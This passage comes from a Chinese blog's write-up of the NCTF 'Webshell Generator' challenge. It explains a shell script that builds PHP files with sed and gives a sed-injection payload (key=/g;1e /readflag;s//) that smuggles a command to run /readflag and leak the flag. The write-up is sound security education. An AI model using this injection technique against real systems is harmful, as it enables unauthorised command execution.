download.php?file=$filename&amp;filename=&#123;$_POST[&#x27;filename&#x27;]&#125;&quot;);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到使用putenv设置环境变量后调用执行了generate.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">generate.sh:</span><br><span class="line">#!/bin/sh</span><br><span class="line"></span><br><span class="line">set -e</span><br><span class="line"></span><br><span class="line">NEW_FILENAME=$(tr -dc a-z0-9 &lt;/dev/urandom | head -c 16)</span><br><span class="line">cp template.php &quot;/tmp/$NEW_FILENAME&quot;</span><br><span class="line">cd /tmp</span><br><span class="line"></span><br><span class="line">sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line">sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;</span><br><span class="line"></span><br><span class="line">realpath &quot;$NEW_FILENAME&quot;</span><br></pre></td></tr></table></figure>
+
+<p>下面是chat对上面脚本文件的解释</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.#!/bin/sh: 这是一个Shebang行，指定了脚本要使用的解释器，这里是/bin/sh。</span><br><span class="line">2.set -e: 这个命令告诉Shell在脚本中任何命令的退出状态不为零时立即退出。这有助于在脚本中及早检测到错误并停止执行。</span><br><span class="line">3.NEW_FILENAME=$(tr -dc a-z0-9 &amp;lt;/dev/urandom | head -c 16): 这一行生成一个16个字符的随机文件名。tr -dc a-z0-9命令从/dev/urandom中读取字符流，然后head -c 16截取前16个字符，最终赋值给NEW_FILENAME变量。</span><br><span class="line">4.cp template.php &quot;/tmp/$NEW_FILENAME&quot;: 这一行复制名为template.php的文件到/tmp目录，并使用先前生成的随机文件名。</span><br><span class="line">5.cd /tmp: 进入/tmp目录，因为后续的sed命令将在这个目录中修改文件。</span><br><span class="line">6.sed -i &quot;s/KEY/$KEY/g&quot; &quot;$NEW_FILENAME&quot;: 这个sed命令用来在新生成的文件中替换所有的&quot;KEY&quot;字符串为脚本中定义的$KEY变量的值。</span><br><span class="line">7.sed -i &quot;s/METHOD/$METHOD/g&quot; &quot;$NEW_FILENAME&quot;: 类似地，这个命令替换所有的&quot;METHOD&quot;字符串为脚本中定义的$METHOD变量的值。</span><br><span class="line">8.realpath &quot;$NEW_FILENAME&quot;: 这个命令返回$NEW_FILENAME的绝对路径。在脚本的上下文中，这可能是为了提供生成的文件的完整路径。</span><br><span class="line"></span><br><span class="line">最终，脚本在/tmp目录生成一个新的PHP文件，基于template.php，并在这个新文件中替换了&quot;KEY&quot;和&quot;METHOD&quot;字符串为相应的变量值。最后，脚本输出新生成文件的绝对路径。</span><br></pre></td></tr></table></figure>
+
+<p>这里使用sed -i “s&#x2F;KEY&#x2F;$KEY&#x2F;g” 来替换模板中的关键字，但是由于使用了双引号包裹(里面的变量或者特殊字符不被解释)无法进行shell命令注入，所以这里使用shell参数展开，这里我们传入key&#x3D;&#x2F;g;1e &#x2F;readflag;s&#x2F;&#x2F;，那么原本的替换语句就变成了sed -i “s&#x2F;&#x2F;g;1e &#x2F;readflag;s&#x2F;&#x2F;&#x2F;$KEY&#x2F;g”</p>
+<p>s&#x2F;&#x2F;g是一个替换指令，由于替换模式为空所以实际上就是将所有内容进行空字符替换</p>
+<p>1e &#x2F;readflag：是一个e指令可以执行系统命令，执行&#x2F;readflag，会将文件内容插入到输出文件的第一行</p>
+<p>做法就是抓包将上面的key传入，然后知晓文件路径，再访问download.php读取上面的文件即可读出flag</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://pzb-creator.github.io">Rem_1st</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://pzb-creator.github.io/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">http://pzb-creator.github.io/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://pzb-creator.github.io" target="_blank">Rem_1st</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/">比赛复现</a></div><div class="post_share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/start/" title="start"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">start</div></div></a></div><div class="next-post pull-right"><a href="/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JNDI注入</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Rem_1st</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/pzb-creator/pzb-creator.github.io.git" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2586474557@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#logging"><span class="toc-number">1.</span> <span class="toc-text">logging</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ez-wordpress"><span class="toc-number">2.</span> <span class="toc-text">ez_wordpress</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Wait-What"><span class="toc-number">3.</span> <span class="toc-text">Wait What?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Webshell-Generator"><span class="toc-number">4.</span> <span class="toc-text">Webshell Generator</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/JNDI%E6%B3%A8%E5%85%A5/" title="JNDI注入">JNDI注入</a><time datetime="2023-12-26T11:56:50.000Z" title="发表于 2023-12-26 19:56:50">2023-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/NCTF%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="NCTF复现">NCTF复现</a><time datetime="2023-12-26T06:15:51.000Z" title="发表于 2023-12-26 14:15:51">2023-12-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/start/" title="start">start</a><time datetime="2023-12-19T06:49:39.000Z" title="发表于 2023-12-19 14:49:39">2023-12-19</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/preview.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Rem_1st</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,welcome to my <a target="_blank" rel="noopener" href="https://rem1st.cn"/>blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>
